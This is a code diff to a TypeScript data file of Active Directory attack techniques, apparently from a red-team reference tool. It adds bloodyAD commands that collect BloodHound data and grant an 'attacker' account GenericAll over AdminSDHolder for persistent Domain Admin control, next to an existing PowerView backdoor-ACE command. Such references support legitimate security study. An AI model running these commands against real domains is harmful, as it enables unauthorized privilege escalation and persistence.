@@ -51,6 +51,16 @@ export const domainDominanceNodes: TechniqueNodeDef[] = [
     summary: 'Routes from a domain user to higher privilege.',
     description:
       'The escalation hub: every way to climb from an ordinary domain account toward Domain Admin, covering ACL/DACL abuse, AD CS, Kerberos delegation, account/group manipulation, and critical CVEs. BloodHound usually shows which branch is shortest.',
+    tools: [
+      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
+    ],
+    commands: [
+      {
+        label: 'Collect BloodHound CE data (bloodyAD)',
+        code: 'bloodyAD -u user -p pass -d domain.local --host dc01 get bloodhound',
+        lang: 'bash',
+      },
+    ],
   },
   {
     id: 'unconstrained-delegation',
@@ -178,6 +188,7 @@ export const domainDominanceNodes: TechniqueNodeDef[] = [
     description:
       'The AdminSDHolder object\'s ACL is pushed to all protected groups every 60 minutes by SDProp. Add an ACE granting yourself control and it is silently re-applied to Domain Admins et al. even after a defender removes you.',
     tools: [
+      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
       { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
       { name: 'Impacket dacledit', url: 'https://github.com/fortra/impacket' },
     ],
@@ -186,6 +197,11 @@ export const domainDominanceNodes: TechniqueNodeDef[] = [
         label: 'Add a persistent ACE to AdminSDHolder',
         code: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,...' -Rights All -PrincipalIdentity backdoor",
         lang: 'powershell',
+      },
+      {
+        label: 'Grant GenericAll over AdminSDHolder (bloodyAD)',
+        code: "bloodyAD -u user -p pass -d domain.local --host dc01 add genericAll 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' attacker",
+        lang: 'bash',
       },
     ],
     requires: ['Domain Admin / write on AdminSDHolder'],
